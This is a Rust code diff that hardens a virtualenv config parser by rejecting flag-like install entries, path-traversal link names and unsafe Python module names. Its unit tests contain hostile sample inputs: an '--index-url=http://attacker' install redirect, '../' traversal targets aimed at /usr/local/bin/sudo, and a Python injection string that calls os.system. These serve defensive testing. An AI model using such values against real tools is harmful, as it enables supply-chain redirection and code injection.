@@ -5,6 +5,8 @@ use std::path::Path;
 use anyhow::{Context, Result, bail};
 use serde::{Deserialize, Serialize};
 
+use crate::locator::{normalize_name, validate_name};
+
 /// Raw TOML config as deserialized from virtualenvs.toml.
 #[derive(Debug, Default, Deserialize)]
 #[serde(default)]
@@ -69,10 +71,12 @@ impl Config {
         let mut virtualenvs = BTreeMap::new();
 
         for (name, raw_venv) in &raw.virtualenv {
+            validate_name(name).context("invalid virtualenv name")?;
             let resolved = resolve_venv(name, raw_venv, &raw.bundle)?;
             virtualenvs.insert(name.clone(), resolved);
         }
 
+        check_for_normalized_name_collisions(&virtualenvs)?;
         check_for_duplicated_links(&virtualenvs)?;
 
         Ok(Config { virtualenvs })
@@ -102,21 +106,100 @@ fn resolve_venv(
         }
     }
 
+    for package in &install {
+        validate_package_arg(package)
+            .with_context(|| format!("invalid install entry in virtualenv {name:?}"))?;
+    }
+
     let requirements: Vec<String> = raw
         .requirements
         .iter()
         .map(|s| expand(s))
         .collect::<Result<_>>()?;
+    for req in &requirements {
+        validate_package_arg(req)
+            .with_context(|| format!("invalid requirements entry in virtualenv {name:?}"))?;
+    }
+
+    let link = parse_link_specs(&raw.link);
+    for spec in &link {
+        validate_filename(&spec.source)
+            .with_context(|| format!("invalid link source in virtualenv {name:?}"))?;
+        validate_filename(&spec.target)
+            .with_context(|| format!("invalid link target in virtualenv {name:?}"))?;
+    }
+
+    let link_module = parse_link_specs(&raw.link_module);
+    for spec in &link_module {
+        validate_python_module(&spec.source)
+            .with_context(|| format!("invalid link-module source in virtualenv {name:?}"))?;
+        validate_filename(&spec.target)
+            .with_context(|| format!("invalid link-module target in virtualenv {name:?}"))?;
+    }
 
     Ok(ResolvedVirtualEnv {
         name: name.to_string(),
         python: raw.python.clone().unwrap_or_else(|| "python3".to_string()),
         install,
         requirements,
-        link: parse_link_specs(&raw.link),
-        link_module: parse_link_specs(&raw.link_module),
+        link,
+        link_module,
         post_commands: raw.post_commands.clone(),
     })
+}
+
+/// Reject anything that `uv pip install` would parse as a flag rather than
+/// as a positional package argument. Without this, an entry like
+/// `--index-url=http://attacker/` silently redirects the install.
+fn validate_package_arg(s: &str) -> Result<()> {
+    if s.is_empty() {
+        bail!("empty package/requirement entry");
+    }
+    if s.starts_with('-') {
+        bail!("entry {s:?} starts with '-' (would be parsed as a flag by uv)");
+    }
+    Ok(())
+}
+
+/// A link source is looked up in the venv's `bin/` and a link target lands
+/// in the link dir. Either with `..` or `/` would let the config reach
+/// outside those directories.
+fn validate_filename(s: &str) -> Result<()> {
+    if s.is_empty() {
+        bail!("empty filename");
+    }
+    if s == "." || s == ".." {
+        bail!("filename {s:?} is a path traversal");
+    }
+    if s.contains('/') || s.contains('\\') || s.contains('\0') {
+        bail!("filename {s:?} contains a path separator or null byte");
+    }
+    if s.chars().any(char::is_control) {
+        bail!("filename {s:?} contains a control character");
+    }
+    Ok(())
+}
+
+/// Validate that `s` is a Python module identifier (`a.b.c`). The string
+/// is interpolated verbatim into a generated Python wrapper, so anything
+/// other than a safe identifier is potential code injection.
+fn validate_python_module(s: &str) -> Result<()> {
+    if s.is_empty() {
+        bail!("empty module name");
+    }
+    let valid = s.split('.').all(|part| {
+        let mut chars = part.chars();
+        match chars.next() {
+            Some(c) if c.is_ascii_alphabetic() || c == '_' => {
+                chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+            }
+            _ => false,
+        }
+    });
+    if !valid {
+        bail!("{s:?} is not a valid Python module name");
+    }
+    Ok(())
 }
 
 fn expand(s: &str) -> Result<String> {
@@ -139,6 +222,33 @@ fn parse_link_specs(specs: &[String]) -> Vec<LinkSpec> {
             },
         })
         .collect()
+}
+
+fn check_for_normalized_name_collisions(
+    virtualenvs: &BTreeMap<String, ResolvedVirtualEnv>,
+) -> Result<()> {
+    let mut by_normalized: BTreeMap<String, Vec<String>> = BTreeMap::new();
+    for name in virtualenvs.keys() {
+        by_normalized
+            .entry(normalize_name(name))
+            .or_default()
+            .push(name.clone());
+    }
+    let collisions: Vec<_> = by_normalized
+        .into_iter()
+        .filter(|(_, names)| names.len() > 1)
+        .collect();
+    if !collisions.is_empty() {
+        let mut details = Vec::new();
+        for (normalized, names) in collisions {
+            details.push(format!("{} -> {normalized}", names.join(", ")));
+        }
+        bail!(
+            "virtualenv names collide after normalization: {}",
+            details.join("; ")
+        );
+    }
+    Ok(())
 }
 
 fn check_for_duplicated_links(virtualenvs: &BTreeMap<String, ResolvedVirtualEnv>) -> Result<()> {
@@ -452,19 +562,19 @@ mod tests {
 
     #[test]
     fn env_var_expansion_in_install() {
-        // SAFETY: test-only, no other threads depend on this variable.
-        unsafe { std::env::set_var("_VENVS_TEST_VAR", "expanded") };
+        // Use HOME (always set on the platforms we support) instead of
+        // mutating the process environment, which is unsafe under parallel
+        // tests.
+        let home = std::env::var("HOME").expect("HOME must be set");
         let config = Config::parse(
             r#"
             [virtualenv.myenv]
-            install = ["$_VENVS_TEST_VAR"]
+            install = ["$HOME"]
             "#,
         )
         .unwrap();
 
-        assert_eq!(config.virtualenvs["myenv"].install, vec!["expanded"]);
-        // SAFETY: test-only, no other threads depend on this variable.
-        unsafe { std::env::remove_var("_VENVS_TEST_VAR") };
+        assert_eq!(config.virtualenvs["myenv"].install, vec![home]);
     }
 
     #[test]
@@ -497,5 +607,166 @@ mod tests {
 
         let names: Vec<_> = config.virtualenvs.keys().map(String::as_str).collect();
         assert_eq!(names, vec!["alpha", "middle", "zebra"]);
+    }
+
+    #[test]
+    fn rejects_path_traversal_venv_name() {
+        let err = Config::parse(
+            r#"
+            [virtualenv."../etc"]
+            "#,
+        )
+        .unwrap_err();
+        assert!(
+            format!("{err:#}").contains("../etc"),
+            "error should name the bad name: {err:#}",
+        );
+    }
+
+    #[test]
+    fn rejects_slash_in_venv_name() {
+        assert!(
+            Config::parse(
+                r#"
+                [virtualenv."foo/bar"]
+                "#,
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn rejects_normalized_name_collisions() {
+        let err = Config::parse(
+            r#"
+            [virtualenv.foo-bar]
+            [virtualenv.foo_bar]
+            "#,
+        )
+        .unwrap_err();
+        let msg = format!("{err:#}");
+        assert!(
+            msg.contains("foo_bar"),
+            "error should name the collision: {msg}"
+        );
+    }
+
+    #[test]
+    fn rejects_install_entry_starting_with_dash() {
+        let err = Config::parse(
+            r#"
+            [virtualenv.myenv]
+            install = ["--index-url=http://attacker"]
+            "#,
+        )
+        .unwrap_err();
+        assert!(format!("{err:#}").contains("'-'"));
+    }
+
+    #[test]
+    fn rejects_requirements_entry_starting_with_dash() {
+        assert!(
+            Config::parse(
+                r#"
+                [virtualenv.myenv]
+                requirements = ["-rother.txt"]
+                "#,
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn rejects_install_via_bundle_starting_with_dash() {
+        assert!(
+            Config::parse(
+                r#"
+                [bundle]
+                bad = ["--index-url=http://attacker"]
+                [virtualenv.myenv]
+                install-bundle = ["bad"]
+                "#,
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn rejects_link_source_with_path_separator() {
+        assert!(
+            Config::parse(
+                r#"
+                [virtualenv.myenv]
+                link = ["../bad:tool"]
+                "#,
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn rejects_link_target_with_path_separator() {
+        assert!(
+            Config::parse(
+                r#"
+                [virtualenv.myenv]
+                link = ["tool:../../usr/local/bin/sudo"]
+                "#,
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn rejects_link_module_target_with_path_separator() {
+        assert!(
+            Config::parse(
+                r#"
+                [virtualenv.myenv]
+                link-module = ["mymod:../evil"]
+                "#,
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn rejects_link_module_source_with_injection() {
+        let err = Config::parse(
+            r#"
+            [virtualenv.myenv]
+            link-module = ["foo\"); __import__(\"os\").system(\"x\"); (\""]
+            "#,
+        )
+        .unwrap_err();
+        assert!(format!("{err:#}").contains("Python module"));
+    }
+
+    #[test]
+    fn accepts_dotted_python_module() {
+        let config = Config::parse(
+            r#"
+            [virtualenv.myenv]
+            link-module = ["pkg.sub.mod:tool"]
+            "#,
+        )
+        .unwrap();
+        assert_eq!(
+            config.virtualenvs["myenv"].link_module[0].source,
+            "pkg.sub.mod"
+        );
+    }
+
+    #[test]
+    fn rejects_link_module_source_starting_with_digit() {
+        assert!(
+            Config::parse(
+                r#"
+                [virtualenv.myenv]
+                link-module = ["1foo:tool"]
+                "#,
+            )
+            .is_err()
+        );
     }
 }
